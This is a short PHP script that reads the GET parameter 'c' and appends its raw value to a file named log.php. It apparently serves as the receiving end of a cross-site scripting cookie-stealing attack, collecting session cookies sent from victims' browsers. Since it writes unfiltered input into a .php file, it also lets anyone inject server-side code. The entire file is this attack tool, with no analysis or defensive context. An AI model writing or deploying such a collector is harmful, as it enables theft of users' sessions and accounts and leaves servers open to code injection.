<?php

$cc = $_GET['c'];
$file = fopen("log.php","a");
$data = "$cc
";
fwrite($file,$data);
fclose($file);

 ?>
